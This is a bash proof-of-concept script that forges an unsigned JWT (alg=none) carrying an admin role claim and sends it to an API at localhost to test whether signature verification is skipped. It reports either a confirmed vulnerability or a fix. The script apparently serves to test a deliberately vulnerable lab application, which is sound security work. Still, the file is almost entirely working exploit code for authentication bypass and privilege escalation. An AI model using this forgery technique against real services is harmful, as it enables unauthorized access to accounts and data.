#!/bin/bash

# Proof of Concept: JWT Forgery
# This script demonstrates how to forge JWT tokens in VULN mode

set -e

API_URL="${API_URL:-http://localhost:5001}"

echo "========================================="
echo "JWT Forgery Proof of Concept"
echo "========================================="
echo ""

# Create a forged token with alg=none
# Header: {"alg":"none"}
# Payload: {"user_id":1,"username":"alice","role":"admin"}

HEADER='{"alg":"none"}'
PAYLOAD='{"user_id":1,"username":"alice","role":"admin"}'

# Base64url encode (note: this is simplified, real base64url encoding needed)
HEADER_B64=$(echo -n "$HEADER" | base64 | tr -d '=' | tr '/+' '_-' | tr -d '\n')
PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 | tr -d '=' | tr '/+' '_-' | tr -d '\n')

# Forged token (no signature)
FORGED_TOKEN="${HEADER_B64}.${PAYLOAD_B64}."

echo "[1] Forged JWT Token Created"
echo "Header: $HEADER"
echo "Payload: $PAYLOAD"
echo "Token: ${FORGED_TOKEN:0:80}..."
echo ""

# Try to use the forged token
echo "[2] Attempting to access API with forged token..."
RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$API_URL/users/1/docs" \
  -H "Authorization: Bearer $FORGED_TOKEN")

HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS" | cut -d: -f2)
RESPONSE_BODY=$(echo "$RESPONSE" | sed '/HTTP_STATUS/d')

echo "HTTP Status: $HTTP_STATUS"
echo ""

if [ "$HTTP_STATUS" == "200" ]; then
    echo "⚠️  VULNERABILITY CONFIRMED: Weak JWT implementation!"
    echo "Forged token was accepted without signature verification:"
    echo "$RESPONSE_BODY" | jq '.'
    echo ""
    echo "Attacker can forge tokens with arbitrary claims (e.g., admin role)."
elif [ "$HTTP_STATUS" == "401" ]; then
    echo "✓ VULNERABILITY FIXED: Token rejected"
    echo "Response:"
    echo "$RESPONSE_BODY" | jq '.'
    echo ""
    echo "The application correctly validates JWT signatures."
else
    echo "Unexpected response:"
    echo "$RESPONSE_BODY"
fi

echo ""
echo "========================================="
echo "JWT forgery attempt complete"
echo "========================================="
